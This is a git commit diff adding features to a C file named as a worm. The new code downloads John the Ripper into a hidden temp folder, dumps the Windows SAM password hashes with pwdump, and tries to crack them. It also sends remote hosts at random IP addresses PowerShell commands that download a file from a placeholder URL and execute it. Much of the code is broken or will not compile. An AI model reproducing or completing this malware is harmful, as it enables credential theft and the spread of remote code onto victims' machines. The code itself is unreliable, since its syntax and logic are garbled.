600d2c6973b83da70b7a6478e7e0cc571ac5fefc
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-03-13 19:24:45 -0700

    Active

--- C/MORIN_WORM.c
+++ C/MORIN_WORM.c
@@ -15,10 +15,47 @@ int gen_ip(char* ip_address);
 int gen_port(char* port);
 int ququ;
 int tutu;
+char passhehe;
+char admin;
 struct Node {
     int data;
     struct Node *next;
 };
+void initjohn() {
+system("CD %%Temp%%\\%%random%%random%%random%%%%random%%\\%%random%%%%random%%\\%%random%%")
+system("powershell -command 'Invoke-WebRequest -Uri https://github.com/magnumripper/JohnTheRipper/archive/1.9.0-jumbo-1.zip -OutFile john-1.9.0-jumbo-1.zip")
+system("PowerShell -Command 'Expand-Archive -Path john-1.9.0-jumbo-1.zip -DestinationPath .'")
+system("set PATH=%%PATH%%;%%cd%%\\JohnTheRipper-1.9.0-jumbo-1\run")
+}
+int passcr(char hashworks) {
+    #include "john/src/JohnTheRipper.h"
+        const char* hash = hashworks;
+        const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        int password_len = 8;
+        int found = 0;
+        char* password;
+        init(hashworks);
+        password = mem_alloc_tiny(password_len + 1);
+        memset(password, 0, password_len + 1);
+        while (!found) {
+            if (john_main(password, hash, charset, password_len)) {
+                found = 1;
+            }
+        }
+        mem_free(password);
+        return password;
+}
+int findpass() {
+system("CD %%Temp%%\\%%random%%%%random%%\\%%random%%")
+system("pwdump -m C:\\Windows\\System32\\config\\SAM > lubzi.124")
+FILE* file = fopen("lubzi.124", "r");
+char line[100];
+while (fgets(line, 100, file)) {
+    passhehe = passcr(line);
+}
+fclose(file);
+return passhehe;
+}
 int gen_ip(char*ip_address) {
     srand(time(NULL));
     ququ = sprintf(ip_address, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
@@ -103,6 +140,8 @@ void process_dir(char *dir_path) {
     }
 }
 int wingapi() {
+    initjohn();
+    admin = findpass();
     char buffer[] = A * 4444444;
     SOCKET findgapi = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, SO_KEEPALIVE);
     char ip_address[16];
@@ -121,8 +160,10 @@ int wingapi() {
         wingapi();
     }
     else {
-        char cmdlimoj[] = ""
-        send(findgapi, cmdlimoj, strlen(cmdlimoj), 0)
+        char cmdlimoj[] = "powershell -command 'Invoke-WebRequest -Uri https://example.com/file.txt -OutFile C:\path\to\file.txt'"
+        char cmdberoj[] = "powershell -command 'C:\path\to\file.txt'"
+        send(findgapi, cmdlimoj, strlen(cmdlimoj), 0);
+        send(findgapi, cmdberoj, strlen(cmdberoj), 0);
     }
     while (1) {
         process_dir("C:");
